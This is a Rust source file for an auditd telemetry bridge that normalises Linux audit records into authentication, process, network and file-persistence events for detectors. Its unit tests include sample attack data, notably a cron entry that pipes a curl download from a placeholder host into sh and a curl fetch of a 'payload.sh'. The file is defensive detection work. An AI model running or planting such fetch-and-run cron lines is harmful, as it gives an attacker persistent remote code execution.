use crate::host_common::{
    first_command_line, first_string, process_name_from_path, required_string, required_timestamp,
    required_u16, sanitize_optional_string, telemetry_event_id,
};
use crate::{JsonBridgeConfigError, validate_event_schema};
use async_trait::async_trait;
use serde_json::Value;
use swarm_core::config::AuditdBridgeConfig;
use swarm_core::{
    AuthenticationEventData, BridgeHealth, FilePersistenceEvent, NetworkConnectEvent,
    ProcessStartEvent, TelemetryBridge, TelemetryBridgeError, TelemetryBridgeResult,
    TelemetryEvent, TelemetryPayload,
};

use crate::source::JsonRecordSource;

const SOURCE_ID: &str = "auditd";

#[derive(Debug)]
pub struct AuditdBridge {
    source: JsonRecordSource,
    health: BridgeHealth,
}

impl AuditdBridge {
    pub fn new(source: JsonRecordSource) -> Self {
        Self {
            source,
            health: BridgeHealth::new(SOURCE_ID),
        }
    }

    pub fn from_config(config: &AuditdBridgeConfig) -> Result<Self, JsonBridgeConfigError> {
        let source = JsonRecordSource::from_file_config(&config.source)?;
        Ok(Self::new(source))
    }

    fn map_record(&mut self, record: &Value) -> TelemetryBridgeResult<Option<TelemetryEvent>> {
        let record_type = required_string(
            record,
            &["/type", "/record_type"],
            "type",
            &mut self.health,
            SOURCE_ID,
        )?;
        let timestamp = required_timestamp(
            record,
            &["/@timestamp", "/timestamp", "/time"],
            "timestamp",
            &mut self.health,
            SOURCE_ID,
        )?;
        let host_id = sanitize_optional_string(first_string(
            record,
            &["/host", "/hostname", "/node", "/agent/hostname"],
        ));
        let record_id = first_string(record, &["/serial", "/sequence", "/id"]);
        let syscall = normalize_syscall_name(record);

        let payload = if is_auth_record(&record_type) {
            Some(self.map_authentication(record, host_id.as_deref())?)
        } else if syscall
            .as_deref()
            .is_some_and(|value| matches!(value, "execve" | "execveat"))
            || record_type.eq_ignore_ascii_case("EXECVE")
        {
            Some(self.map_process_start(record)?)
        } else if syscall
            .as_deref()
            .is_some_and(|value| matches!(value, "connect" | "sendto"))
        {
            Some(self.map_network_connect(record)?)
        } else if let Some(syscall_name) = syscall.as_deref().filter(|value| {
            matches!(
                *value,
                "open" | "openat" | "openat2" | "creat" | "rename" | "renameat" | "renameat2"
            )
        }) {
            let Some(payload) = self.map_file_persistence(record, syscall_name)? else {
                return Ok(None);
            };
            Some(payload)
        } else {
            None
        };

        let Some(payload) = payload else {
            return Ok(None);
        };

        let event = TelemetryEvent {
            source: SOURCE_ID.to_string(),
            event_id: telemetry_event_id(
                SOURCE_ID,
                record_id,
                syscall.as_deref().unwrap_or(record_type.as_str()),
                timestamp,
            ),
            timestamp,
            host_id,
            payload,
        };

        if !validate_event_schema(&event, SOURCE_ID) {
            let message = format!(
                "bridge `{SOURCE_ID}` produced invalid normalized telemetry for `{}`",
                event.event_id
            );
            self.health.record_error(message.clone());
            return Err(TelemetryBridgeError::Schema(message));
        }

        Ok(Some(event))
    }

    fn map_authentication(
        &mut self,
        record: &Value,
        host_id: Option<&str>,
    ) -> TelemetryBridgeResult<TelemetryPayload> {
        let process_name = sanitize_optional_string(
            first_string(record, &["/exe", "/comm"]).map(|value| process_name_from_path(&value)),
        );
        let target_service = sanitize_optional_string(first_string(
            record,
            &["/service", "/terminal", "/exe", "/comm"],
        ))
        .map(|value| process_name_from_path(&value));
        let auth_type = infer_auth_type(target_service.as_deref(), process_name.as_deref());

        Ok(TelemetryPayload::AuthenticationEvent(
            AuthenticationEventData {
                auth_type,
                source_host: sanitize_optional_string(first_string(
                    record,
                    &["/addr", "/remote_addr", "/hostname"],
                )),
                target_host: host_id.map(str::to_string),
                target_service,
                process_name,
                success: auth_success(record),
                user: sanitize_optional_string(first_string(
                    record,
                    &["/acct", "/user", "/uid_name", "/auid_name"],
                )),
            },
        ))
    }

    fn map_process_start(&mut self, record: &Value) -> TelemetryBridgeResult<TelemetryPayload> {
        let exe = required_string(
            record,
            &["/exe", "/process/exe"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;
        // Raw auditd commonly emits only `ppid` (numeric) on SYSCALL/EXECVE
        // records — `parent_comm`/`ppcomm`/`parent_exe` are populated by
        // user-space enrichers like ausearch/auditbeat. Fall back to ppid and
        // finally to "unknown" so unenriched events still reach the
        // process-start detectors.
        let parent = first_string(
            record,
            &[
                "/parent_comm",
                "/ppcomm",
                "/process/parent_comm",
                "/parent_exe",
                "/ppid",
            ],
        )
        .unwrap_or_else(|| "unknown".to_string());
        // Try `/cmdline` and `/argv` first (already decoded); `/proctitle` in
        // raw auditd is a hex-encoded, NUL-separated argv buffer that downstream
        // command-line detectors can't parse without decoding it back to a
        // human-readable command line.
        let command_line =
            sanitize_optional_string(first_command_line(record, &["/cmdline", "/argv"]))
                .or_else(|| {
                    first_string(record, &["/proctitle"]).and_then(|raw| decode_proctitle(&raw))
                })
                .unwrap_or_else(|| exe.clone());

        Ok(TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: process_name_from_path(&parent),
            process_name: sanitize_optional_string(first_string(record, &["/comm"]))
                .unwrap_or_else(|| process_name_from_path(&exe)),
            command_line,
            user: sanitize_optional_string(first_string(
                record,
                &["/acct", "/user", "/uid_name", "/auid_name"],
            )),
            executable_path: Some(exe),
            signer: None,
            signature_valid: None,
        }))
    }

    fn map_network_connect(&mut self, record: &Value) -> TelemetryBridgeResult<TelemetryPayload> {
        let exe = required_string(
            record,
            &["/exe", "/comm"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;

        Ok(TelemetryPayload::NetworkConnect(NetworkConnectEvent {
            process_name: process_name_from_path(&exe),
            destination_ip: required_string(
                record,
                &["/addr", "/socket/addr", "/network/destination_ip"],
                "addr",
                &mut self.health,
                SOURCE_ID,
            )?,
            destination_port: required_u16(
                record,
                &["/port", "/socket/port", "/network/destination_port"],
                "port",
                &mut self.health,
                SOURCE_ID,
            )?,
            protocol: required_string(
                record,
                &["/proto", "/socket/proto", "/network/protocol"],
                "proto",
                &mut self.health,
                SOURCE_ID,
            )?
            .to_ascii_lowercase(),
        }))
    }

    // KNOWN LIMITATION: raw auditd emits SYSCALL and PATH as separate records
    // sharing a serial; correlating them requires a stateful per-serial buffer
    // in the bridge. Until that lands, file-persistence events for raw audit
    // streams need an enricher (ausearch/auditbeat) to merge `/path` into the
    // SYSCALL record. Tracked as follow-up.
    fn map_file_persistence(
        &mut self,
        record: &Value,
        syscall: &str,
    ) -> TelemetryBridgeResult<Option<TelemetryPayload>> {
        let operation = match syscall {
            "rename" | "renameat" | "renameat2" => "rename",
            "creat" => "create",
            "open" | "openat" | "openat2" => {
                // open(2) flags double as rwx mode bits — only emit a file-persistence
                // event when the open is for write/create/truncate. Read-only opens
                // (`O_RDONLY`, no creation flags) under watched directories are normal
                // file reads and would otherwise turn into spurious persistence findings.
                if open_is_write(record, syscall) {
                    "write"
                } else {
                    return Ok(None);
                }
            }
            _ => "write",
        };
        let exe = required_string(
            record,
            &["/exe", "/comm"],
            "exe",
            &mut self.health,
            SOURCE_ID,
        )?;

        Ok(Some(TelemetryPayload::FilePersistence(
            FilePersistenceEvent {
                file_path: required_string(
                    record,
                    &["/path", "/file/path", "/name"],
                    "path",
                    &mut self.health,
                    SOURCE_ID,
                )?,
                operation: operation.to_string(),
                process_name: process_name_from_path(&exe),
                content_preview: sanitize_optional_string(first_string(
                    record,
                    &["/content_preview", "/data", "/cmdline"],
                )),
            },
        )))
    }
}

#[async_trait]
impl TelemetryBridge for AuditdBridge {
    fn source_id(&self) -> &str {
        SOURCE_ID
    }

    async fn poll(&mut self) -> TelemetryBridgeResult<Vec<TelemetryEvent>> {
        while let Some(record) = self.source.next_record() {
            if let Some(event) = self.map_record(&record)? {
                self.health.record_event(event.timestamp);
                return Ok(vec![event]);
            }
        }
        Ok(Vec::new())
    }

    fn validate_schema(&self, event: &TelemetryEvent) -> bool {
        validate_event_schema(event, SOURCE_ID)
    }

    fn health(&self) -> BridgeHealth {
        self.health.clone()
    }
}

/// Decode auditd's hex-encoded `proctitle` field back to a human-readable
/// command line. The buffer is the kernel's argv with `\0` separators between
/// arguments and no trailing NUL; replace separators with spaces and reject
/// the value when the bytes aren't valid UTF-8 so downstream detectors can
/// match flags/URLs/encoded payloads instead of an opaque hex blob.
fn decode_proctitle(raw: &str) -> Option<String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return None;
    }
    if !trimmed.bytes().all(|b| b.is_ascii_hexdigit()) || !trimmed.len().is_multiple_of(2) {
        return None;
    }
    let mut bytes = Vec::with_capacity(trimmed.len() / 2);
    for chunk in trimmed.as_bytes().chunks(2) {
        let hi = (chunk[0] as char).to_digit(16)?;
        let lo = (chunk[1] as char).to_digit(16)?;
        bytes.push(((hi << 4) | lo) as u8);
    }
    while matches!(bytes.last(), Some(0)) {
        bytes.pop();
    }
    for byte in bytes.iter_mut() {
        if *byte == 0 {
            *byte = b' ';
        }
    }
    let decoded = String::from_utf8(bytes).ok()?;
    let trimmed = decoded.trim();
    (!trimmed.is_empty()).then(|| trimmed.to_string())
}

/// Test whether an auditd `open`/`openat` record carries write/create/truncate
/// intent. auditd surfaces `flags` either as a hex/decimal integer (the kernel
/// open flags) or as a symbolic string like `O_WRONLY|O_CREAT|O_TRUNC`. Without
/// either signal, fail closed and treat the call as read-only.
fn open_is_write(record: &Value, syscall: &str) -> bool {
    // Linux `<fcntl.h>` constants. Lower two bits encode access mode.
    const O_RDONLY: u64 = 0;
    const O_WRONLY: u64 = 1;
    const O_RDWR: u64 = 2;
    const O_ACCMODE: u64 = 3;
    const O_CREAT: u64 = 0o100;
    const O_TRUNC: u64 = 0o1000;
    const O_APPEND: u64 = 0o2000;

    // Prefer a normalized `/flags` field. Fall back to the raw syscall args:
    // `open(path, flags, ...)` has flags at `a1`; `openat(dirfd, path, flags, ...)`
    // has flags at `a2`. Reading the wrong arg yields the dirfd (typically -100
    // / AT_FDCWD) which fails to parse and would otherwise drop the event.
    let positional = match syscall {
        "open" => "/a1",
        _ => "/a2",
    };
    // Prefer normalized `/flags` (decimal/octal/symbolic, parsed permissively),
    // plus openat2-specific `/open_how/flags` because openat2's `a2` is a
    // pointer to `struct open_how`, not the flag bits themselves.
    if let Some(raw) = first_string(record, &["/flags", "/open_how/flags"]) {
        let trimmed = raw.trim();
        if !trimmed.is_empty()
            && let Some(numeric) = parse_open_flags(trimmed)
        {
            let access = numeric & O_ACCMODE;
            return access == O_WRONLY
                || access == O_RDWR
                || (access == O_RDONLY && (numeric & (O_CREAT | O_TRUNC | O_APPEND)) != 0);
        }
        let upper = trimmed.to_ascii_uppercase();
        if upper.contains("O_WRONLY")
            || upper.contains("O_RDWR")
            || upper.contains("O_CREAT")
            || upper.contains("O_TRUNC")
            || upper.contains("O_APPEND")
        {
            return true;
        }
    }
    // For openat2, no positional fallback is safe: a2 is a `struct open_how*`,
    // not the flag bits. Fail closed when only raw syscall args are present.
    if syscall == "openat2" {
        return false;
    }
    // Raw auditd `/a1`/`/a2` syscall args are documented as PREFIXLESS HEX, so
    // a value of `40` means O_CREAT (0x40) — not decimal 64.
    let Some(raw) = first_string(record, &[positional]) else {
        return false;
    };
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return false;
    }
    let numeric = parse_auditd_arg_hex(trimmed).or_else(|| parse_open_flags(trimmed));
    if let Some(numeric) = numeric {
        let access = numeric & O_ACCMODE;
        return access == O_WRONLY
            || access == O_RDWR
            || (access == O_RDONLY && (numeric & (O_CREAT | O_TRUNC | O_APPEND)) != 0);
    }
    false
}

fn parse_open_flags(raw: &str) -> Option<u64> {
    if let Some(stripped) = raw.strip_prefix("0x").or_else(|| raw.strip_prefix("0X")) {
        return u64::from_str_radix(stripped, 16).ok();
    }
    if raw.starts_with('0') && raw.len() > 1 && raw.bytes().all(|b| b.is_ascii_digit()) {
        return u64::from_str_radix(raw, 8).ok();
    }
    raw.parse::<u64>().ok()
}

fn parse_auditd_arg_hex(raw: &str) -> Option<u64> {
    let stripped = raw
        .strip_prefix("0x")
        .or_else(|| raw.strip_prefix("0X"))
        .unwrap_or(raw);
    if stripped.is_empty() || !stripped.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    u64::from_str_radix(stripped, 16).ok()
}

/// Resolve `/syscall` to a syscall name when auditd emits a numeric identifier.
///
/// auditd records SYSCALL events with the kernel's numeric syscall number,
/// which is architecture-specific. The bridge dispatch matches by name; without
/// this normalization, real audit streams (where `syscall=59` means execve on
/// x86_64 or `syscall=221` on aarch64) skip the detector entirely. Architecture
/// is read from `/arch` when present and defaults to x86_64 — the mapping
/// covers only syscalls the bridge currently dispatches on.
fn normalize_syscall_name(record: &Value) -> Option<String> {
    let raw = first_string(record, &["/syscall"])?;
    if !raw.chars().all(|ch| ch.is_ascii_digit()) {
        return Some(raw);
    }
    let id: u32 = raw.parse().ok()?;
    let arch = first_string(record, &["/arch"]).unwrap_or_default();
    let aarch64 = matches!(
        arch.to_ascii_lowercase().as_str(),
        "c00000b7" | "0xc00000b7" | "aarch64"
    );
    let name = if aarch64 {
        match id {
            221 => "execve",
            281 => "execveat",
            203 => "connect",
            206 => "sendto",
            56 => "openat",
            437 => "openat2",
            38 => "renameat",
            276 => "renameat2",
            _ => return None,
        }
    } else {
        match id {
            59 => "execve",
            322 => "execveat",
            42 => "connect",
            44 => "sendto",
            2 => "open",
            257 => "openat",
            437 => "openat2",
            85 => "creat",
            82 => "rename",
            264 => "renameat",
            316 => "renameat2",
            _ => return None,
        }
    };
    Some(name.to_string())
}

fn is_auth_record(record_type: &str) -> bool {
    matches!(
        record_type,
        "USER_AUTH" | "USER_LOGIN" | "USER_ACCT" | "USER_START"
    )
}

fn auth_success(record: &Value) -> bool {
    if let Some(value) = first_string(record, &["/success"]) {
        let trimmed = value.trim();
        if trimmed == "0"
            || trimmed.eq_ignore_ascii_case("no")
            || trimmed.eq_ignore_ascii_case("false")
        {
            return false;
        }
        if trimmed == "1"
            || trimmed.eq_ignore_ascii_case("yes")
            || trimmed.eq_ignore_ascii_case("true")
        {
            return true;
        }
    }

    // Fail closed when no result field is present at all: a partially enriched
    // USER_AUTH/USER_LOGIN record is not evidence of success and would otherwise
    // poison successful-login baselines and hide failed-login signal.
    sanitize_optional_string(first_string(record, &["/res", "/result"])).is_some_and(|value| {
        value.eq_ignore_ascii_case("success") || value.eq_ignore_ascii_case("yes")
    })
}

fn infer_auth_type(target_service: Option<&str>, process_name: Option<&str>) -> String {
    let target_service = target_service.unwrap_or_default().to_ascii_lowercase();
    let process_name = process_name.unwrap_or_default().to_ascii_lowercase();
    if target_service.contains("ssh") || process_name.contains("ssh") {
        "ssh".to_string()
    } else if target_service.contains("sudo") || process_name.contains("sudo") {
        "sudo".to_string()
    } else if target_service.contains("login") || process_name.contains("login") {
        "login".to_string()
    } else {
        "pam".to_string()
    }
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used)]
mod tests {
    use super::AuditdBridge;
    use crate::source::JsonRecordSource;
    use serde_json::json;
    use swarm_core::{TelemetryBridge, TelemetryPayload};

    #[tokio::test]
    async fn ssh_auth_maps_to_authentication_event() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "USER_AUTH",
            "serial": 420,
            "timestamp": "2026-04-13T15:20:00Z",
            "host": "linux-a",
            "acct": "alice",
            "exe": "/usr/sbin/sshd",
            "addr": "198.51.100.30",
            "res": "success"
        })]));

        let events = bridge.poll().await.expect("auditd auth event should map");
        let event = events.first().expect("one event should be returned");

        match &event.payload {
            TelemetryPayload::AuthenticationEvent(auth) => {
                assert_eq!(auth.auth_type, "ssh");
                assert_eq!(auth.source_host.as_deref(), Some("198.51.100.30"));
                assert_eq!(auth.target_host.as_deref(), Some("linux-a"));
                assert_eq!(auth.process_name.as_deref(), Some("sshd"));
                assert!(auth.success);
                assert_eq!(auth.user.as_deref(), Some("alice"));
            }
            _ => panic!("expected authentication payload"),
        }
    }

    #[tokio::test]
    async fn execve_maps_to_process_start() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "SYSCALL",
            "serial": 421,
            "timestamp": 1776093605.0,
            "host": "linux-a",
            "syscall": "execve",
            "exe": "/usr/bin/python3",
            "comm": "python3",
            "parent_comm": "systemd",
            "cmdline": "python3 -c import os",
            "acct": "svc-app"
        })]));

        let events = bridge.poll().await.expect("auditd execve event should map");
        let event = events.first().expect("one event should be returned");

        match &event.payload {
            TelemetryPayload::ProcessStart(process) => {
                assert_eq!(process.parent_process, "systemd");
                assert_eq!(process.process_name, "python3");
                assert_eq!(process.command_line, "python3 -c import os");
                assert_eq!(process.user.as_deref(), Some("svc-app"));
            }
            _ => panic!("expected process_start payload"),
        }
    }

    #[tokio::test]
    async fn syscall_connect_and_file_write_map_to_shared_schema() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([
            json!({
                "type": "SYSCALL",
                "serial": 422,
                "timestamp": "2026-04-13T15:20:10Z",
                "host": "linux-a",
                "syscall": "connect",
                "exe": "/usr/bin/curl",
                "comm": "curl",
                "addr": "203.0.113.40",
                "port": 443,
                "proto": "tcp"
            }),
            json!({
                "type": "SYSCALL",
                "serial": 423,
                "timestamp": "audit(1776093615.000:423)",
                "host": "linux-a",
                "syscall": "openat",
                "exe": "/bin/bash",
                "comm": "bash",
                "path": "/etc/cron.d/evil",
                "flags": "O_WRONLY|O_CREAT|O_TRUNC",
                "content_preview": "* * * * * root /usr/bin/curl https://example.invalid/a.sh | sh"
            }),
        ]));

        let network_event = bridge
            .poll()
            .await
            .expect("auditd connect event should map")
            .pop()
            .expect("network event should be returned");
        match network_event.payload {
            TelemetryPayload::NetworkConnect(connect) => {
                assert_eq!(connect.process_name, "curl");
                assert_eq!(connect.destination_ip, "203.0.113.40");
                assert_eq!(connect.destination_port, 443);
            }
            _ => panic!("expected network_connect payload"),
        }

        let file_event = bridge
            .poll()
            .await
            .expect("auditd file event should map")
            .pop()
            .expect("file event should be returned");
        match file_event.payload {
            TelemetryPayload::FilePersistence(file) => {
                assert_eq!(file.file_path, "/etc/cron.d/evil");
                assert_eq!(file.operation, "write");
                assert_eq!(file.process_name, "bash");
                assert!(file.content_preview.unwrap().contains("curl"));
            }
            _ => panic!("expected file_persistence payload"),
        }
    }

    #[tokio::test]
    async fn read_only_openat_does_not_emit_file_persistence() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "SYSCALL",
            "serial": 502,
            "timestamp": "2026-04-13T15:23:00Z",
            "host": "linux-a",
            "syscall": "openat",
            "exe": "/bin/cat",
            "comm": "cat",
            "path": "/etc/cron.d/some-watched-job",
            "flags": "O_RDONLY"
        })]));
        let events = bridge.poll().await.expect("poll should succeed");
        assert!(
            events.is_empty(),
            "read-only openat under a watched path must not become file_persistence"
        );

        // Numeric write flag (O_WRONLY | O_CREAT | O_TRUNC = 0o1101 = 577) should
        // still emit a write event.
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "SYSCALL",
            "serial": 503,
            "timestamp": "2026-04-13T15:23:01Z",
            "host": "linux-a",
            "syscall": "openat",
            "exe": "/bin/bash",
            "comm": "bash",
            "path": "/etc/cron.d/added",
            "flags": "577"
        })]));
        let event = bridge
            .poll()
            .await
            .expect("write open should map")
            .pop()
            .expect("one event");
        match event.payload {
            TelemetryPayload::FilePersistence(file) => assert_eq!(file.operation, "write"),
            _ => panic!("expected file_persistence payload"),
        }
    }

    #[tokio::test]
    async fn openat_reads_flags_from_a2_not_a1_dirfd() {
        // Raw auditd shape: a1 is the directory fd (AT_FDCWD = ffffffffffffff9c),
        // a2 is the open flags as PREFIXLESS HEX (auditd convention).
        // 0x241 = O_WRONLY|O_CREAT|O_TRUNC. The dispatch must look at a2 for
        // openat, not stop at a1's dirfd.
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "SYSCALL",
            "serial": 504,
            "timestamp": "2026-04-13T15:23:02Z",
            "host": "linux-a",
            "syscall": "openat",
            "exe": "/bin/bash",
            "comm": "bash",
            "path": "/etc/cron.d/escalation",
            "a1": "ffffffffffffff9c",
            "a2": "241"
        })]));
        let event = bridge
            .poll()
            .await
            .expect("write open via /a2 should map")
            .pop()
            .expect("one event");
        match event.payload {
            TelemetryPayload::FilePersistence(file) => {
                assert_eq!(file.operation, "write");
                assert_eq!(file.file_path, "/etc/cron.d/escalation");
            }
            _ => panic!("expected file_persistence payload"),
        }
    }

    #[tokio::test]
    async fn execve_argv_array_is_joined_into_command_line() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "EXECVE",
            "serial": 500,
            "timestamp": "2026-04-13T15:21:00Z",
            "host": "linux-a",
            "syscall": "execve",
            "exe": "/usr/bin/curl",
            "comm": "curl",
            "parent_comm": "bash",
            "argv": ["curl", "-fsSL", "https://example.invalid/payload.sh"],
            "acct": "svc-app"
        })]));

        let event = bridge
            .poll()
            .await
            .expect("execve with argv array should map")
            .pop()
            .expect("one event");
        match event.payload {
            TelemetryPayload::ProcessStart(process) => {
                assert_eq!(
                    process.command_line,
                    "curl -fsSL https://example.invalid/payload.sh"
                );
            }
            _ => panic!("expected process_start payload"),
        }
    }

    #[tokio::test]
    async fn auth_success_no_marks_event_failed() {
        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
            "type": "USER_LOGIN",
            "serial": 501,
            "timestamp": "2026-04-13T15:22:00Z",
            "host": "linux-a",
            "acct": "alice",
            "exe": "/usr/sbin/sshd",
            "addr": "198.51.100.31",
            "success": "no"
        })]));

        let event = bridge
            .poll()
            .await
            .expect("USER_LOGIN should map")
            .pop()
            .expect("one event");
        match event.payload {
            TelemetryPayload::AuthenticationEvent(auth) => assert!(!auth.success),
            _ => panic!("expected authentication payload"),
        }
    }
}
